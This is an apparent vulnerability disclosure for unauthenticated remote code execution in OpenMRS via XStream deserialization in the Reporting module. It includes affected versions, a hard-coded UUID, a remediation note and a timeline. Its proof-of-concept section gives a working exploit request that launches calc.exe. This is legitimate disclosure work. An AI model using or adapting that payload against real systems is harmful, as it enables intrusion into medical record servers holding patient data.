@@ -1,0 +1,55 @@
+Title: Unauthenticated remote code execution in OpenMRS
+Product: OpenMRS
+Vendor: OpenMRS Inc.
+Tested versions: See summary
+Status: Fixed by vendor
+Reported by: Brian D. Hysell
+
+Product description:
+
+OpenMRS is "the world's leading open source enterprise electronic
+medical record system platform."
+
+Vulnerability summary:
+
+The OpenMRS Reporting Module 0.9.7 passes untrusted XML input to a
+version of the XStream library vulnerable to CVE-2013-7285, making it
+vulnerable to remote code execution. If the Appointment Scheduling UI
+Module 1.0.3 is also installed, this RCE is accessible to
+unauthenticated attackers. OpenMRS Standalone 2.3 and OpenMRS Platform
+1.11.4 WAR with Reporting 0.9.7 and Appointment Scheduling UI 1.0.3
+installed were confirmed to be vulnerable; other versions and
+configurations containing these modules are likely to be vulnerable as
+well (see "Remediation").
+
+Details:
+
+In the Reporting module, the method saveSerializedDefinition (mapped
+to module/reporting/definition/saveSerializedDefinition) in
+InvalidSerializedDefinitionController can be accessed by an
+unauthenticated user.
+
+The attacker must provide a valid UUID for a definition present in
+OpenMRS or a NullPointerException will be thrown before the remote
+code execution can take place. However, upon initialization the
+Appointments Scheduling UI module inserts a definition with a constant
+UUID hard-coded into AppointmentSchedulingUIConstants
+(c1bf0730-e69e-11e3-ac10-0800200c9a66).
+
+Proof of concept:
+
+GET /openmrs-standalone/module/reporting/definition/saveSerializedDefinition.form?type=org.openmrs.OpenmrsObject&serializationClass=org.openmrs.module.serialization.xstream.XStreamSerializer&serializedData=<dynamic-proxy><interface>org.openmrs.OpenmrsObject</interface><handler%20class%3d"java.beans.EventHandler"><target%20class%3d"java.lang.ProcessBuilder"><command><string>calc.exe</string></command></target><action>start</action></handler></dynamic-proxy>&uuid=c1bf0730-e69e-11e3-ac10-0800200c9a66&name=test&subtype=org.openmrs.OpenmrsObject
+
+Remediation:
+
+The vendor has addressed this issue in OpenMRS Standalone 2.3.1,
+OpenMRS Reference Application 2.3.1, and OpenMRS Platform 1.11.5,
+1.10.3, and 1.9.10.
+
+Timeline:
+
+Vendor contacted: November 2, 2015
+Vendor replied: November 3
+CVE requested: November 14 (no response)
+Patch released: December 2
+Announced: January 6, 2016
